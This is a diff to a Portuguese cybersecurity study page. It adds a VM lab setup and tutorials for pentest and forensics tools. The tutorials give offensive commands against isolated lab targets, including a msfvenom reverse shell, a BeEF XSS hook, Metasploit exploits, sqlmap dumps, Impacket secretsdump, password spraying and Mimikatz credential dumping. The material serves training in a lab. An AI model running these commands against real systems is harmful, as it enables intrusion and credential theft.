@@ -9107,11 +9107,12 @@ document.querySelectorAll('#provaA .jumpcard').forEach(function(j){
 })();
 </script>
 <script>
-/* ===== Aba Ferramentas: arsenal (render + busca + modal) ===== */
+/* ===== Aba Ferramentas: arsenal (render + busca + modal + tutorial em VM) ===== */
 (function(){
   var mount=document.getElementById('tmount'); if(!mount) return;
 
   var CATS=[
+    ['lab','🖥️ Laboratório (VMs)'],
     ['recon','🔍 Recon & Enumeração'],
     ['web','🌐 Web & API'],
     ['exploit','🏴‍☠️ Exploração · AD · Reverse · Pwn'],
@@ -9128,9 +9129,23 @@ document.querySelectorAll('#provaA .jumpcard').forEach(function(j){
   ];
 
   var DATA=`
+VirtualBox|multi|LAB|lab|Hipervisor gratuito|Virtualiza todas as VMs do lab; use rede host-only e snapshots|virtualbox.org|virtualbox.org
+VMware Workstation / Fusion|multi|LAB|lab|Hipervisor (alternativa)|Virtualização robusta com snapshots e redes isoladas|vmware.com|vmware.com
+Kali Linux (atacante)|lin|A,B,C,E,F|lab|Estação de ataque|VM com ~600 ferramentas; 4–8 GB RAM; é de onde você roda os comandos|kali.org/get-kali|kali.org/get-kali
+Metasploitable 2|lin|B,E|lab|Alvo Linux vulnerável|Treino de recon e exploração; x86 (não roda em Apple Silicon); ~1–2 GB|sourceforge.net/projects/metasploitable|sourceforge.net/projects/metasploitable
+Metasploitable 3|multi|B,E|lab|Alvo Windows+Linux (Vagrant)|Falhas de serviço realistas; montado com Vagrant/Packer|github.com/rapid7/metasploitable3|github.com/rapid7/metasploitable3
+DVWA|web|B,E,F|lab|App web vulnerável|SQLi/XSS/LFI com níveis (low/medium/high) para treino gradual|github.com/digininja/DVWA|github.com/digininja/DVWA
+OWASP Juice Shop|web|E,F|lab|App web moderna vulnerável|Treino do OWASP Top 10 numa SPA realista|owasp.org/juice-shop|owasp.org/www-project-juice-shop
+OWASP WebGoat|web|F|lab|App de ensino de AppSec|Lições guiadas de vulnerabilidades web|owasp.org/webgoat|owasp.org/www-project-webgoat
+Windows 10/11 Eval|win|A,C,E|lab|Cliente Windows (avaliação)|Endpoint/alvo para logging e cliente de domínio; do MS Evaluation Center|microsoft.com/evalcenter|microsoft.com/en-us/evalcenter
+Windows Server 2022 Eval (DC)|win|A,E|lab|Domain Controller|AD DS, DNS e GPO para o laboratório de domínio|microsoft.com/evalcenter|microsoft.com/en-us/evalcenter
+GOAD (Game of AD)|win|A,E|lab|Laboratório de AD vulnerável|Kerberoasting, BloodHound e DCSync prontos; exige bastante RAM|github.com/Orange-Cyberdefense/GOAD|github.com/Orange-Cyberdefense/GOAD
+Security Onion|lin|C,D|lab|Monitoração de rede (NSM/SIEM)|Suricata + Zeek + Elastic num só appliance; Manager pede 16 GB+|securityonion.net|securityonion.net
+Wazuh (VM)|lin|A,C,D|lab|SIEM/XDR (o da Prova D)|Coletor, detecção, FIM e resposta ativa|documentation.wazuh.com|documentation.wazuh.com
+pfSense|multi|A|lab|Firewall / roteador|Segmentar a rede do lab e filtrar o tráfego|pfsense.org/download|pfsense.org
 Nmap|multi|A,B,C,E|recon|Scanner de rede e portas|Descobrir hosts, portas, serviços e versões — o 1º passo de todo recon|nmap -sC -sV -p- -T4 alvo|nmap.org
 Masscan|lin|E|recon|Scanner de portas ultrarrápido|Varrer faixas enormes de IP em segundos|masscan -p1-65535 10.0.0.0/8 --rate 10000|github.com/robertdavidgraham/masscan
-Netdiscover|lin|E|recon|Descoberta ARP na LAN|Listar hosts vivos numa rede local|netdiscover -r 192.168.1.0/24|kali.org/tools/netdiscover
+Netdiscover|lin|E|recon|Descoberta ARP na LAN|Listar hosts vivos numa rede local|netdiscover -r 192.168.56.0/24|kali.org/tools/netdiscover
 theHarvester|lin|E|recon|OSINT de e-mails e subdomínios|Coletar e-mails, hosts e nomes de uma empresa|theHarvester -d empresa.com -b all|github.com/laramies/theHarvester
 Recon-ng|lin|E|recon|Framework de OSINT modular|Reconhecimento com várias fontes num só lugar|recon-ng|github.com/lanmaster53/recon-ng
 Maltego|multi|E|recon|OSINT gráfico (grafos)|Mapear relações entre pessoas, domínios e infra|interface gráfica|maltego.com
@@ -9231,7 +9246,7 @@ CIS Benchmarks|multi|A,D|harden|Padrões de configuração segura|Guia de harden
 PingCastle|win|A|harden|Auditoria de Active Directory|Gerar nota de risco do AD|PingCastle.exe|pingcastle.com
 HardeningKitty|win|A|harden|Hardening de Windows|Avaliar e aplicar baseline no Windows|Invoke-HardeningKitty|github.com/scipag/HardeningKitty
 testssl.sh|lin|A|harden|Teste de TLS/SSL|Checar protocolos e ciphers de um serviço|testssl.sh https://alvo|testssl.sh
-pfSense|multi|A|harden|Firewall/roteador|Segmentar a rede e filtrar o tráfego|interface gráfica|pfsense.org
+pfSense (firewall)|multi|A|harden|Firewall/roteador|Segmentar a rede e filtrar o tráfego|interface gráfica|pfsense.org
 Semgrep|multi|F|appsec|SAST multi-linguagem|Achar padrões inseguros no código-fonte|semgrep --config auto .|semgrep.dev
 CodeQL|multi|F|appsec|SAST semântico|Consultar o fluxo de dados do código|codeql database analyze db consulta.ql|codeql.github.com
 Bandit|lin|B,F|appsec|SAST para Python|Achar falhas comuns em código Python|bandit -r app/|github.com/PyCQA/bandit
@@ -9255,7 +9270,6 @@ HackTricks|web|B|ref|Wiki de metodologia|Passo a passo de pentest por serviço|b
 PayloadsAllTheThings|web|B,E|ref|Coleção de payloads|Payloads e bypasses por categoria|github.com/swisskyrepo|github.com/swisskyrepo/PayloadsAllTheThings
 Exploit-DB|web|B|ref|Base de exploits públicos|Achar PoC/exploit para um serviço|exploit-db.com|exploit-db.com
 OWASP|web|E,F|ref|Fundação de AppSec|Top 10, ASVS, WSTG e Cheat Sheets|owasp.org|owasp.org
-OWASP Juice Shop|web|F|ref|App vulnerável para treino|Praticar exploração e defesa web|owasp.org/juice-shop|owasp.org/www-project-juice-shop
 PortSwigger Academy|web|B,F|ref|Labs web gratuitos|Treinar vulnerabilidades web guiado|portswigger.net/web-security|portswigger.net/web-security
 TryHackMe|web|B,E|ref|Treino guiado por salas|Aprender na prática por tema|tryhackme.com|tryhackme.com
 Hack The Box|web|B,E|ref|Máquinas e labs de pentest|Praticar em alvos realistas|hackthebox.com|hackthebox.com
@@ -9264,8 +9278,159 @@ OverTheWire|web|B|ref|Wargames de fundamentos|Aprender base de Linux/segurança 
 NIST|web|A,F|ref|Padrões de segurança|CSF, SSDF e SP 800-53 (controles e SDLC)|csrc.nist.gov|csrc.nist.gov
 `;
 
+  /* ===== Tutoriais passo a passo (lab em VM), por ferramenta ===== */
+  var TUT={
+"VirtualBox":{a:"Sua máquina física (host)",s:["Baixe e instale o VirtualBox + Extension Pack.","Crie uma rede isolada: File → Tools → Network Manager → criar rede Host-Only (ex.: 192.168.56.0/24).","Importe cada VM (.ova) por File → Import Appliance.","Em cada VM, ajuste o adaptador para 'Host-Only' e tire um snapshot antes de usar."],r:"Lab isolado funcionando, com snapshots para reverter a qualquer erro."},
+"VMware Workstation / Fusion":{a:"Sua máquina física (host)",s:["Instale o VMware Workstation (Windows/Linux) ou Fusion (Mac).","Crie uma rede 'Host-only' em Virtual Network Editor.","Abra cada VM e coloque a placa nessa rede.","Tire um snapshot inicial de cada VM."],r:"Mesmo lab isolado, com snapshots, no VMware."},
+"Kali Linux (atacante)":{a:"VM Kali (atacante)",s:["Baixe a imagem do kali.org/get-kali (VirtualBox/VMware).","Suba a VM e faça login (kali/kali).","Atualize: sudo apt update && sudo apt full-upgrade -y","Confirme o IP na rede host-only: ip a (ex.: 192.168.56.10)."],r:"Estação de ataque pronta e na mesma rede dos alvos."},
+"Metasploitable 2":{a:"VM Metasploitable 2 (alvo)",s:["Baixe do SourceForge e importe no hipervisor.","Coloque a placa na rede host-only e inicie (login msfadmin/msfadmin).","Descubra o IP: ifconfig (ex.: 192.168.56.20).","Do Kali, teste: ping 192.168.56.20"],r:"Alvo Linux vulnerável acessível para recon e exploração."},
+"Metasploitable 3":{a:"VM Metasploitable 3 (alvo)",s:["Instale Vagrant + Packer no host.","Clone o repo e rode: vagrant up (gera a VM Windows ou Linux).","Coloque na rede host-only.","Do Kali: nmap -sV IP_do_alvo"],r:"Alvo realista com múltiplos serviços vulneráveis."},
+"DVWA":{a:"VM Linux (ou container) servindo o DVWA",s:["Suba via Docker: docker run -d -p 80:80 vulnerables/web-dvwa","Acesse http://IP_da_VM no navegador do Kali.","Faça login (admin/password) e clique em 'Create/Reset Database'.","Ajuste DVWA Security para 'low' no início."],r:"App web vulnerável pronta para SQLi, XSS e LFI."},
+"OWASP Juice Shop":{a:"VM/container com o Juice Shop",s:["Suba via Docker: docker run -d -p 3000:3000 bkimminich/juice-shop","Acesse http://IP_da_VM:3000 no Kali.","Explore o app e abra o painel de score (#/score-board).","Comece pelos desafios de 1 estrela."],r:"Alvo moderno (SPA) para treinar o OWASP Top 10."},
+"OWASP WebGoat":{a:"VM/container com o WebGoat",s:["Suba via Docker: docker run -d -p 8080:8080 webgoat/webgoat","Acesse http://IP_da_VM:8080/WebGoat.","Crie um usuário e siga as lições guiadas.","Use o Burp em paralelo para ver as requisições."],r:"Ambiente de ensino com lições passo a passo de AppSec."},
+"Windows 10/11 Eval":{a:"VM Windows (avaliação)",s:["Baixe a ISO/VM no Microsoft Evaluation Center.","Instale e coloque na rede host-only.","Habilite logs (Sysmon) se for praticar detecção.","Para AD, junte ao domínio do DC."],r:"Endpoint Windows para logging, cliente de domínio e alvo."},
+"Windows Server 2022 Eval (DC)":{a:"VM Windows Server (DC)",s:["Baixe o Server 2022 Eval no MS Evaluation Center.","Instale a função AD DS e promova a Domain Controller (dcpromo/Server Manager).","Crie o domínio (ex.: lab.local), usuários e grupos.","Configure DNS e, se quiser, GPOs vulneráveis para treino."],r:"Domínio Active Directory para as Provas A e E."},
+"GOAD (Game of AD)":{a:"Conjunto de VMs de AD (GOAD)",s:["Clone github.com/Orange-Cyberdefense/GOAD no host.","Garanta RAM suficiente (vários GB) e Vagrant/Ansible instalados.","Rode o provisionamento (./goad.sh ou instruções do repo).","Do Kali: bloodhound-python para mapear o domínio."],r:"Floresta AD vulnerável pronta para Kerberoasting, DCSync e lateral movement."},
+"Security Onion":{a:"VM Security Onion (monitor)",s:["Baixe a ISO em securityonion.net e instale numa VM com 16 GB+ de RAM.","Configure uma interface em modo monitor (espelhamento/mirror).","Gere tráfego/ataques do Kali contra os alvos.","Abra o Security Onion Console (SOC) e cace os eventos."],r:"SOC-in-a-box (Suricata+Zeek+Elastic) vendo o tráfego do lab."},
+"Wazuh (VM)":{a:"VM Wazuh (manager)",s:["Instale o Wazuh (curl -sO ... wazuh-install.sh && sudo bash ./wazuh-install.sh -a) ou use a OVA.","Acesse o dashboard (https://IP_do_wazuh).","Instale o agente nos alvos (Linux/Windows) apontando para o manager.","Dispare um evento e valide com wazuh-logtest."],r:"SIEM/XDR da Prova D coletando e detectando no lab."},
+"pfSense":{a:"VM pfSense (firewall)",s:["Baixe em pfsense.org/download e instale a VM com 2 placas (WAN/LAN).","Coloque os alvos atrás da LAN do pfSense.","Acesse a WebGUI (https://192.168.1.1) e crie regras de firewall.","Teste o bloqueio/liberação a partir do Kali."],r:"Rede do lab segmentada e filtrada por firewall."},
+"Nmap":{a:"Metasploitable 2 (ex.: 192.168.56.20), a partir do Kali",s:["Confirme conectividade: ping 192.168.56.20","Varredura de portas/versões: nmap -sV -p- 192.168.56.20","Scripts de enumeração: nmap -sC -sV -p 21,80,445 192.168.56.20","Salve o resultado: nmap -sV -oN scan.txt 192.168.56.20"],r:"Lista de portas abertas + versões para escolher o próximo passo."},
+"Masscan":{a:"Rede host-only do lab, a partir do Kali",s:["Rode rápido em toda a faixa: masscan -p1-65535 192.168.56.0/24 --rate 1000","Salve: adicione -oL massout.txt","Confirme os achados com um nmap -sV focado nas portas abertas."],r:"Mapa veloz de quais hosts/portas existem antes do nmap detalhado."},
+"Netdiscover":{a:"Rede host-only do lab",s:["Rode: sudo netdiscover -r 192.168.56.0/24","Anote os IPs e MACs que aparecerem.","Cruze com o nmap para identificar cada host."],r:"Lista de hosts vivos na LAN sem fazer barulho de scan de portas."},
+"theHarvester":{a:"Domínio de exemplo (lab) ou simulação offline",s:["Rode: theHarvester -d empresa.com -b bing,duckduckgo","Revise e-mails, subdomínios e hosts retornados.","Alimente o resultado em wordlists/alvos."],r:"Superfície de OSINT (e-mails, hosts) do alvo."},
+"Recon-ng":{a:"Kali (OSINT)",s:["Abra: recon-ng","Instale módulos: marketplace install all","Defina o alvo: modules load recon/domains-hosts/... ; options set SOURCE empresa.com ; run"],r:"Dados de recon organizados no banco do workspace."},
+"Maltego":{a:"Kali (GUI)",s:["Abra o Maltego e crie uma conta Community.","Arraste uma entidade (Domain) e informe o alvo.","Rode 'transforms' para expandir o grafo."],r:"Mapa visual de relações do alvo."},
+"Amass":{a:"Domínio de exemplo (lab)",s:["Enumere: amass enum -d empresa.com","Revise os subdomínios descobertos.","Exporte para alimentar o fuzzing/scan."],r:"Lista ampla de subdomínios (superfície externa)."},
+"dnsrecon":{a:"DNS do lab (ex.: o DC) ",s:["Rode: dnsrecon -d lab.local -n 192.168.56.40","Tente zone transfer: dnsrecon -d lab.local -t axfr","Anote registros e subdomínios."],r:"Registros DNS e possíveis subdomínios do domínio."},
+"enum4linux-ng":{a:"Metasploitable 2 ou DC (SMB)",s:["Rode: enum4linux-ng -A 192.168.56.20","Observe usuários, shares e política de senha.","Use os usuários achados num brute/spray posterior."],r:"Enumeração completa de SMB: usuários, grupos e shares."},
+"smbclient":{a:"Metasploitable 2 (SMB)",s:["Liste shares: smbclient -L //192.168.56.20 -N","Conecte a um share: smbclient //192.168.56.20/tmp -N","Baixe arquivos com get dentro do prompt."],r:"Acesso e download de arquivos de compartilhamentos SMB."},
+"WhatWeb":{a:"DVWA/Juice Shop (web)",s:["Rode: whatweb http://192.168.56.21","Identifique servidor, linguagem e CMS.","Direcione o próximo scan conforme a stack."],r:"Fingerprint das tecnologias do alvo web."},
+"Gobuster":{a:"DVWA/Juice Shop (web)",s:["Diretórios: gobuster dir -u http://192.168.56.21 -w /usr/share/seclists/Discovery/Web-Content/common.txt","Observe respostas 200/301/403.","Explore os caminhos encontrados no navegador."],r:"Diretórios e arquivos ocultos descobertos."},
+"ffuf":{a:"DVWA/Juice Shop (web)",s:["Fuzz de diretórios: ffuf -u http://192.168.56.21/FUZZ -w wordlist.txt","Filtre por tamanho/status: adicione -fc 404","Fuzz de parâmetros trocando FUZZ pela posição do parâmetro."],r:"Caminhos/parâmetros válidos isolados do ruído."},
+"Burp Suite":{a:"DVWA/Juice Shop, com o navegador do Kali",s:["Abra o Burp e configure o navegador para o proxy 127.0.0.1:8080.","Instale o certificado do Burp no navegador.","Navegue no alvo e veja as requisições em Proxy → HTTP history.","Envie uma requisição para o Repeater e modifique parâmetros."],r:"Controle total das requisições para testar manualmente."},
+"OWASP ZAP":{a:"DVWA/Juice Shop (web)",s:["Scan rápido no CI: zap-baseline.py -t http://192.168.56.21","Ou abra a GUI, informe a URL e rode 'Automated Scan'.","Revise os alertas por severidade."],r:"Relatório de vulnerabilidades web (DAST) do alvo."},
+"sqlmap":{a:"DVWA (nível low) ou Juice Shop",s:["Logue no DVWA e copie a URL: http://192.168.56.21/vulnerabilities/sqli/?id=1","Pegue o cookie (DevTools → Application → Cookies).","Rode: sqlmap -u \"http://.../?id=1\" --cookie=\"PHPSESSID=...; security=low\" --batch","Liste bancos (--dbs) e extraia (--dump -D dvwa)."],r:"Injeção confirmada e dados do banco extraídos."},
+"Nuclei":{a:"Qualquer alvo web do lab",s:["Atualize templates: nuclei -update-templates","Rode CVEs: nuclei -u http://192.168.56.21 -t cves/","Rode misconfig: nuclei -u http://192.168.56.21 -t http/misconfiguration/"],r:"Lista de CVEs/misconfigs batidos por templates."},
+"Nikto":{a:"Metasploitable 2 (porta 80)",s:["Rode: nikto -h http://192.168.56.20","Revise arquivos perigosos e headers ausentes.","Investigue manualmente os achados interessantes."],r:"Problemas conhecidos do servidor web listados."},
+"WPScan":{a:"Um WordPress de lab (ex.: container wpscan/wordpress)",s:["Enumere: wpscan --url http://192.168.56.21 --enumerate u,vp","Pegue um token gratuito do WPScan para dados de vulnerabilidade.","Brute de usuário: wpscan --url ... -U admin -P rockyou.txt"],r:"Plugins/temas vulneráveis e usuários enumerados."},
+"commix":{a:"App com parâmetro vulnerável a comando (lab)",s:["Rode: commix -u \"http://192.168.56.21/ping?ip=127.0.0.1\"","Deixe o commix detectar a técnica de injeção.","Abra um shell: adicione --os-shell"],r:"Execução de comando no servidor confirmada."},
+"wfuzz":{a:"DVWA/Juice Shop (web)",s:["Fuzz de diretório: wfuzz -w wl.txt -u http://192.168.56.21/FUZZ","Esconda o ruído: --hc 404","Fuzz de login trocando FUZZ no corpo POST."],r:"Recursos ou credenciais válidas isolados."},
+"BeEF":{a:"Página vulnerável a XSS + navegador 'vítima' no lab",s:["Inicie: beef-xss (anote a URL do hook.js).","Injete o gancho via XSS no alvo: uma tag script apontando para http://IP:3000/hook.js (o script do hook).","Abra a página com o navegador vítima.","No painel do BeEF, execute comandos no navegador fisgado."],r:"Navegador da vítima controlado pelo painel do BeEF."},
+"Metasploit":{a:"Metasploitable 2 (ex.: 192.168.56.20)",s:["Abra: msfconsole","Busque um exploit: search vsftpd 2.3.4","Configure: use exploit/unix/ftp/vsftpd_234_backdoor ; set RHOSTS 192.168.56.20 ; run","Confirme a sessão: sessions -i 1"],r:"Shell no alvo via um serviço vulnerável conhecido."},
+"msfvenom":{a:"Kali (gerar) + alvo que executará o payload",s:["Gere: msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.56.10 LPORT=443 -f elf -o shell.elf","No Kali, abra o listener (multi/handler) no msfconsole.","Entregue/execute o payload no alvo.","Receba a sessão no handler."],r:"Shell reverso do alvo conectando no Kali."},
+"searchsploit":{a:"Kali (offline)",s:["Pesquise: searchsploit vsftpd 2.3.4","Veja o exploit: searchsploit -x unix/remote/XXXX.rb","Copie para o diretório de trabalho: searchsploit -m XXXX"],r:"PoC/exploit local pronto para estudar/usar."},
+"Impacket":{a:"DC do lab (ex.: 192.168.56.40)",s:["Kerberoast: impacket-GetUserSPNs lab.local/user:senha -dc-ip 192.168.56.40 -request","Dump de hashes (com admin): impacket-secretsdump lab.local/admin:senha@192.168.56.40","Exec remoto: impacket-psexec lab.local/admin:senha@192.168.56.40"],r:"Tickets/hashes extraídos e execução remota no domínio."},
+"CrackMapExec / NetExec":{a:"Rede do DC/clientes do lab",s:["Enumere SMB: nxc smb 192.168.56.0/24","Spray de senha: nxc smb 192.168.56.0/24 -u users.txt -p 'Verao@2025'","Com credencial válida: nxc smb 192.168.56.40 -u admin -p senha --shares"],r:"Hosts, usuários válidos e shares mapeados em massa."},
+"Evil-WinRM":{a:"Windows/DC com WinRM e credencial válida",s:["Conecte: evil-winrm -i 192.168.56.40 -u admin -p senha","Liste arquivos e navegue como no PowerShell.","Baixe/suba arquivos com download/upload."],r:"Shell interativo no Windows via WinRM."},
+"BloodHound":{a:"DC do lab (ex.: 192.168.56.40)",s:["Colete: bloodhound-python -d lab.local -u user -p senha -c All -ns 192.168.56.40","Suba o neo4j e abra o BloodHound (GUI).","Importe os .json coletados.","Rode 'Shortest paths to Domain Admins'."],r:"Caminho de ataque até Domain Admin visualizado."},
+"Mimikatz":{a:"VM Windows (como admin local)",s:["Abra o mimikatz como administrador.","privilege::debug","sekurlsa::logonpasswords (hashes/credenciais em memória)","Opcional: lsadump::sam"],r:"Credenciais/hashes extraídos da memória do Windows."},
+"Responder":{a:"Rede host-only com um Windows gerando tráfego",s:["Inicie: sudo responder -I eth0","No Windows, acesse um share inexistente (\\\\servidor\\x).","Capture o hash NetNTLM no Responder.","Leve o hash ao hashcat (-m 5600)."],r:"Hash NetNTLMv2 capturado para cracking."},
+"proxychains":{a:"Após ter um host comprometido como pivô",s:["Configure uma rota/túnel (ex.: SSH -D ou meterpreter).","Edite /etc/proxychains4.conf com o socks.","Rode: proxychains nmap -sT -Pn 10.10.10.5"],r:"Scan/acesso a uma rede interna através do pivô."},
+"PowerSploit":{a:"VM Windows (PowerShell)",s:["Importe o módulo: Import-Module .\\PowerUp.ps1","Rode: Invoke-AllChecks","Analise os vetores de privesc sugeridos."],r:"Lista de caminhos de escalonamento no Windows."},
+"Ghidra":{a:"Kali + um binário de desafio (CTF)",s:["Abra o Ghidra e crie um projeto.","Importe o binário e deixe analisar.","Abra a função main no Decompiler.","Procure comparações de senha/flag."],r:"Lógica do binário entendida (ex.: condição da flag)."},
+"radare2 / Cutter":{a:"Kali + binário de desafio",s:["Abra: r2 -A ./bin","Liste funções: afl","Desmonte a main: pdf @ main","Veja strings: iz"],r:"Fluxo e strings do binário analisados."},
+"pwntools":{a:"Kali + binário vulnerável (pwn)",s:["Esboce o exploit em Python: from pwn import *","Conecte: io = process('./bin') (ou remote(host,port))","Monte o payload (offset + endereço) e envie com io.sendline(...).","io.interactive() para pegar a shell."],r:"Exploit automatizado entregando shell no binário."},
+"gdb (GEF/pwndbg)":{a:"Kali + binário de desafio",s:["Abra: gdb ./bin","Rode com padrão cíclico para achar offset: pattern create / run","Veja registradores no crash: info registers","Coloque breakpoints: b *main"],r:"Offset e estado dos registradores para montar o exploit."},
+"checksec":{a:"Kali + binário de desafio",s:["Rode: checksec --file=./bin","Veja NX, PIE, Canary e RELRO.","Escolha a técnica conforme as proteções (ret2libc, ROP…)."],r:"Proteções do binário conhecidas antes de explorar."},
+"ROPgadget / ropper":{a:"Kali + binário de desafio",s:["Liste gadgets: ROPgadget --binary ./bin","Filtre o que precisa (pop rdi; ret).","Monte a cadeia ROP no seu exploit pwntools."],r:"Gadgets selecionados para a cadeia ROP."},
+"apktool":{a:"Kali + um APK de teste",s:["Decompile: apktool d app.apk -o saida/","Explore AndroidManifest.xml e a pasta smali.","Edite e recompile: apktool b saida/ -o novo.apk"],r:"Recursos e código smali do app acessíveis."},
+"jadx":{a:"Kali + um APK de teste",s:["Abra: jadx-gui app.apk","Navegue pelo código Java reconstruído.","Procure chaves/URLs/segredos embutidos."],r:"Código Java do APK legível para análise."},
+"linpeas / winpeas":{a:"Shell de baixo privilégio no alvo (Metasploitable/Windows)",s:["Transfira o script (ex.: via python -m http.server no Kali + wget no alvo).","Linux: ./linpeas.sh | tee out.txt ; Windows: .\\winpeas.exe","Leia os itens destacados em vermelho/amarelo.","Investigue o vetor mais promissor."],r:"Vetores de escalonamento de privilégio priorizados."},
+"pspy":{a:"Shell sem root no alvo Linux",s:["Transfira o binário pspy64 para o alvo.","Rode: ./pspy64","Observe cron jobs e processos de outros usuários.","Identifique um script gravável executado como root."],r:"Tarefas agendadas/processos privilegiados reveladas sem root."},
+"Hashcat":{a:"Kali (idealmente com GPU) + hash capturado",s:["Identifique o modo (-m) conforme o hash.","Rode: hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt","Acompanhe com status; veja crackeados: hashcat -m 0 hash.txt --show"],r:"Senha em claro recuperada a partir do hash."},
+"John the Ripper":{a:"Kali + hash (ex.: /etc/shadow do Metasploitable)",s:["Combine: unshadow passwd shadow > hashes.txt","Rode: john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt","Veja resultados: john --show hashes.txt"],r:"Senhas quebradas a partir dos hashes."},
+"Hydra":{a:"Metasploitable 2 (SSH/FTP)",s:["Monte a lista de usuários/senhas.","Rode: hydra -l msfadmin -P rockyou.txt ssh://192.168.56.20","Observe o par válido encontrado."],r:"Credencial válida descoberta por brute force."},
+"Medusa":{a:"Metasploitable 2 (serviço de rede)",s:["Rode: medusa -h 192.168.56.20 -u admin -P rockyou.txt -M ssh","Acompanhe as tentativas em paralelo.","Anote a credencial válida."],r:"Credencial válida achada (alternativa ao Hydra)."},
+"CeWL":{a:"Alvo web do lab",s:["Gere a lista: cewl http://192.168.56.21 -w wl.txt -d 2","Revise as palavras coletadas.","Use wl.txt no Hydra/Hashcat."],r:"Wordlist personalizada com termos do próprio alvo."},
+"Crunch":{a:"Kali",s:["Gere por padrão: crunch 6 6 -t Senha% -o wl.txt","Confira o tamanho estimado antes de gerar listas enormes.","Use a lista no cracking."],r:"Wordlist sob medida para um padrão conhecido."},
+"hashid":{a:"Kali + um hash desconhecido",s:["Rode: hashid '$1$abc...'","Anote os possíveis formatos e o modo Hashcat sugerido (-m).","Prossiga para o cracking com o modo certo."],r:"Tipo de hash identificado para escolher o ataque."},
+"SecLists":{a:"Kali",s:["Explore: ls /usr/share/seclists","Use dicionários de senha (Passwords/) e de diretórios (Discovery/Web-Content/).","Aponte as ferramentas (ffuf, hydra) para esses arquivos."],r:"Dicionários prontos para fuzzing e brute force."},
+"fcrackzip":{a:"Kali + um .zip protegido (desafio)",s:["Dicionário: fcrackzip -D -p rockyou.txt -u segredo.zip","(ou) brute: fcrackzip -b -c a1 -l 1-5 -u segredo.zip","Extraia com a senha encontrada."],r:"Senha do ZIP recuperada."},
+"CyberChef":{a:"Navegador (dado de um desafio)",s:["Abra o CyberChef (local ou web).","Cole o dado na entrada.","Arraste 'operations' (From Base64, From Hex, Magic).","Leia a saída decodificada."],r:"Dado ofuscado decodificado em cadeia."},
+"RsaCtfTool":{a:"Kali + chave/parametros RSA de um desafio",s:["Com a chave pública: RsaCtfTool --publickey key.pub --private","Com n e e: RsaCtfTool -n ... -e ... --uncipher ...","Use a chave recuperada para decifrar."],r:"Chave privada recuperada / mensagem decifrada."},
+"xortool":{a:"Kali + arquivo cifrado em XOR (desafio)",s:["Estime a chave: xortool arquivo.bin","Informe o tamanho/char mais comum quando perguntado.","Veja a saída em xortool_out/."],r:"Chave XOR e texto claro recuperados."},
+"OpenSSL":{a:"Serviço TLS do lab (ex.: https do alvo)",s:["Teste a conexão: openssl s_client -connect 192.168.56.21:443","Veja o certificado: openssl x509 -in cert.pem -text -noout","Gere um par de chaves: openssl genrsa -out key.pem 2048"],r:"Detalhes de TLS/certificado e chaves geradas."},
+"Volatility 3":{a:"Um dump de memória (.raw/.vmem) do desafio",s:["Processos: vol -f mem.raw windows.pslist","Conexões: vol -f mem.raw windows.netscan","Injeção: vol -f mem.raw windows.malfind","Extraia: vol -f mem.raw windows.dumpfiles --pid 1234"],r:"Processo malicioso e C2 identificados no dump."},
+"Autopsy / Sleuth Kit":{a:"Uma imagem de disco (.dd/.E01) do desafio",s:["Abra o Autopsy e crie um caso, adicionando a imagem.","Deixe os ingest modules rodarem.","Explore arquivos apagados e timeline.","CLI: fls -r imagem.dd ; icat imagem.dd INODE"],r:"Arquivos, deletados e linha do tempo recuperados."},
+"Wireshark":{a:"Um PCAP do desafio (ou captura ao vivo)",s:["Abra o .pcap no Wireshark.","Filtre: http ou tcp.port==80","Siga o fluxo: botão direito → Follow → TCP Stream.","Exporte objetos: File → Export Objects → HTTP."],r:"Conteúdo e artefatos extraídos do tráfego."},
+"tshark":{a:"Um PCAP do desafio",s:["Veja HTTP: tshark -r cap.pcap -Y http","Extraia campos: tshark -r cap.pcap -T fields -e ip.src -e http.host","Conte conversas: tshark -r cap.pcap -q -z conv,tcp"],r:"Dados do PCAP extraídos via linha de comando."},
+"Zeek":{a:"Um PCAP do desafio",s:["Processe: zeek -r cap.pcap","Abra os logs gerados (conn.log, dns.log, http.log).","Analise: cat conn.log | zeek-cut id.orig_h id.resp_h service"],r:"Logs estruturados de rede para caça a ameaças."},
+"binwalk":{a:"Kali + arquivo/firmware de desafio",s:["Analise: binwalk firmware.bin","Extraia: binwalk -e firmware.bin","Explore a pasta _firmware.bin.extracted/."],r:"Arquivos e sistemas de arquivos embutidos extraídos."},
+"foremost / scalpel":{a:"Imagem de disco do desafio",s:["Rode: foremost -i imagem.dd -o saida/","Abra a pasta saida/ por tipo de arquivo.","Revise imagens/docs recuperados."],r:"Arquivos recuperados por assinatura (file carving)."},
+"bulk_extractor":{a:"Imagem de disco do desafio",s:["Rode: bulk_extractor -o saida/ imagem.dd","Abra email.txt, url.txt e telephone.txt.","Correlacione os indicadores encontrados."],r:"E-mails, URLs e outros artefatos extraídos em massa."},
+"exiftool":{a:"Kali + uma foto/arquivo do desafio",s:["Leia metadados: exiftool foto.jpg","Procure GPS, autor e software.","Para limpar: exiftool -all= foto.jpg"],r:"Metadados (inclusive GPS) revelados ou removidos."},
+"steghide":{a:"Kali + imagem/áudio de desafio",s:["Tente extrair: steghide extract -sf img.jpg","Informe a senha (pode vir de outro passo do desafio).","Leia o arquivo escondido."],r:"Dado oculto extraído da mídia."},
+"zsteg":{a:"Kali + um PNG/BMP de desafio",s:["Rode: zsteg img.png","Varra todos os canais: zsteg -a img.png","Extraia o payload apontado."],r:"Dados escondidos em LSB revelados."},
+"YARA":{a:"Kali + amostra/pasta suspeita do desafio",s:["Escreva ou pegue uma regra .yar.","Rode: yara -r regra.yar /caminho/","Veja quais arquivos casaram."],r:"Arquivos maliciosos identificados por assinatura."},
+"Guymager":{a:"Um disco/USB a ser periciado",s:["Abra o Guymager na VM forense.","Selecione o dispositivo e 'Acquire image'.","Escolha formato (E01) e confira o hash ao final."],r:"Imagem forense íntegra (com hash) criada."},
+"Chainsaw":{a:"Logs EVTX do Windows (do desafio/do DC)",s:["Rode: chainsaw hunt Caminho/Logs/ -s sigma/ --mapping mapping.yml","Revise as detecções por severidade.","Pivote para o evento bruto suspeito."],r:"Eventos suspeitos dos logs do Windows destacados."},
